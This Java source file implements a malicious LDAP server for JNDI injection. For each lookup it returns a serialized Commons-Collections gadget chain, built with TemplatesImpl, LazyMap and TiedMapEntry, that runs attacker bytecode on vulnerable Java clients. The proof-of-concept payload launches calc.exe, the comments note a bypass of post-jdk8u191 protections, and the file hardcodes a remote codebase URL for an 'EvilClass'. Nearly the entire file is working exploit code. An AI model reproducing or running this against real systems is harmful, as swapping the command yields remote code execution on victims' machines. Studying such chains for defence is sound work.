package jndi;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;


public class ldapserver {


    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] tmp_args) throws Exception {

        String[] args = new String[]{"http://139.9.134.169/jndi/#EvilClass"};
        int port = 1100;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {

            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass cc = pool.makeClass("Squirt1e");
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
            cc.makeClassInitializer().insertBefore(cmd);
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
            cc.writeFile();
            byte[] classBytes = cc.toBytecode();
            byte[][] targetByteCodes = new byte[][]{classBytes};
            //补充实例化新建类所需的条件
            TemplatesImpl templates = TemplatesImpl.class.newInstance();

            setFieldValue(templates, "_bytecodes", targetByteCodes);
            setFieldValue(templates, "_name", "Squirt1e");

            ChainedTransformer c = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
            });

            HashMap map=new HashMap();
            Map lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));//先放进去一个触发不了的,避免序列化的时候触发

            TiedMapEntry tiedMapEntry=new TiedMapEntry(map,"Squirt1e");
            HashMap<Object,String> hashmap=new HashMap<Object,String>();
            hashmap.put(tiedMapEntry,"Squirt1e");

            Class claz=TiedMapEntry.class;
            Field tiedMap=claz.getDeclaredField("map");
            tiedMap.setAccessible(true);
            tiedMap.set(tiedMapEntry,lazyMap);

            // 将factory重新赋值为lazyMap从而触发factory.transform
            Class clazz=LazyMap.class;
            Field factory=clazz.getDeclaredField("factory");
            factory.setAccessible(true);
            factory.set(lazyMap,c);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(hashmap);
            objectOutputStream.close();

            //jdk8u191之后
            e.addAttribute("javaClassName", "foo");
            //getObject获取Gadget

            e.addAttribute("javaSerializedData", byteArrayOutputStream.toByteArray());

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

}